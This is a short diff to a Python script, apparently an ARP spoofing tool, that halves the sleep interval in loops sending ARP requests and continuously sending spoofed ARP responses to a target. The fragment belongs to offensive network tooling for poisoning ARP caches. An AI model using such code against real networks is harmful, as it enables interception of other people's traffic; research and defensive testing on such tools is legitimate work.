@@ -202,7 +202,7 @@ if __name__ == "__main__":
                                                target_mac="00:00:00:00:00:00",
                                                target_ip=Base.get_netiface_random_ip(network_interface))
                 socket_global.send(arp_request)
-                sleep(2)
+                sleep(1)
         # endregion
 
         # region ARP spoofing with ARP responses
@@ -217,7 +217,7 @@ if __name__ == "__main__":
                                              target_ip=target_ip_address)
             while True:
                 socket_global.send(arp_response)
-                sleep(2)
+                sleep(1)
         # endregion
 
     except KeyboardInterrupt:
